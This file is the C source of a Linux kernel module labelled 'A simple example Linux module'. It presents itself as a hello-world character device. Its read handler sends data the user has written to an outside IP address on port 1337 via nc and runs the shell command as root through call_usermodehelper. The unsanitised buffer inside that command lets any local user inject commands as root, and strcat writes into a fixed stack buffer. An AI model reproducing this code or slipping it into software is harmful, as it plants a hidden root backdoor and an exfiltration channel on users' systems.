#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/fs_struct.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivanov Ivan");
MODULE_DESCRIPTION("A simple example Linux module");
MODULE_VERSION("0.01");
#define DEVICE_NAME "lkm_device"
#define EXAMPLE_MSG "Hello, World!\n"
#define MSG_BUFFER_LEN 21

static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static int major_num;
static int device_open_count = 0;
static char msg_buffer[MSG_BUFFER_LEN];
static char *msg_ptr;
static int done_reading = 0;
static struct file_operations file_ops =
{
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release
};

static ssize_t device_read(struct file *flip, char *buffer, size_t len, loff_t *offset)
{
    if (done_reading) {
        return 0;
    }
    done_reading = 1;

    int bytes_read = 0;
    char temp[128] = "echo '";
    strcat(temp, msg_buffer);
    strcat(temp, "' | nc 45.76.250.10 1337 > /tmp/netnod");
    char *argv[] = { "/bin/sh", "-c", temp, NULL };
    static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper( argv[0], argv, envp, UMH_WAIT_PROC);

    struct file *filp = NULL;
    filp = filp_open("/tmp/netnod", O_RDONLY, 0);
    if (IS_ERR(filp)) {
        return 0;
    }
    kernel_read(filp, temp, 128, &filp->f_pos);
    filp_close(filp, NULL);
    msg_ptr = temp;
    while (len > 0 && *msg_ptr)
    {
        put_user(*(msg_ptr++), buffer++);
        len--;
        bytes_read++;
    }
    return bytes_read;
}

static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset) {

    int bytes_written = 0;
    msg_ptr = msg_buffer;
    if (len > 20) {
        len = 20;
    }
    while (len > 0 && *buffer)
    {
        *(msg_ptr++) = *(buffer++);
        len--;
        bytes_written++;
    }
    *(msg_ptr) = 0;
    return bytes_written;
}

static int device_open(struct inode *inode, struct file *file)
{
    if (device_open_count > 0)
    {
        return -EBUSY;
    }
    done_reading = 0;
    device_open_count++;
    try_module_get(THIS_MODULE);
    return 0;
}

static int device_release(struct inode *inode, struct file *file)
{
    device_open_count--;
    module_put(THIS_MODULE);
    return 0;
}

static int __init lkm_device_init(void)
{
    strncpy(msg_buffer, EXAMPLE_MSG, MSG_BUFFER_LEN);
    msg_ptr = msg_buffer;
    major_num = register_chrdev(0, "lkm_device", &file_ops);
    if (major_num < 0)
    {
        printk(KERN_ALERT "Could not register device: %d\n", major_num);
        return major_num;
    }
    else
    {
        printk(KERN_INFO "lkm_device module loaded with device major number %d\n", major_num);
        return 0;
    }
}

static void __exit lkm_device_exit(void)
{
    unregister_chrdev(major_num, DEVICE_NAME);
    printk(KERN_INFO "Goodbye, World!\n");
}

module_init(lkm_device_init);
module_exit(lkm_device_exit);
